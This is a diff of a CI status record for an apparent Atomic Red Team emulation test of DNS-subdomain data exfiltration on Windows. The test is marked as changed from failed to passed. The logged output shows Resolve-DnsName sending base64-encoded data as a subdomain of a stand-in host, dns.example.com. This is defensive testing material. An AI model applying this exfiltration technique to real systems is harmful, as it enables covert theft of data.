@@ -2,12 +2,11 @@
   "guid": "c9207f3e-213d-4cc7-ad2a-7697a7237df9",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\nPrerequisites met: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\nResolve-DnsName : U2VjcmV0RGF0YVRvRXhmaWx0cmF0ZQ==.dns.example.com : DNS name contains an invalid character\r\nAt line:11 char:2\r\n+  Resolve-DnsName -Name $dnsQuery\r\n+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ResourceUnavailable: (U2VjcmV0RGF0YVR...dns.example.com:String) [Resolve-DnsName], Win32 \r\n   Exception\r\n    + FullyQualifiedErrorId : DNS_ERROR_INVALID_NAME_CHAR,Microsoft.DnsClient.Commands.ResolveDnsName\r\nExit code: 0\r\nDone executing test: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\nDone executing cleanup for test: \r\nT1041-2 Text Based Data Exfiltration using DNS subdomains\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmphw5qpp.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
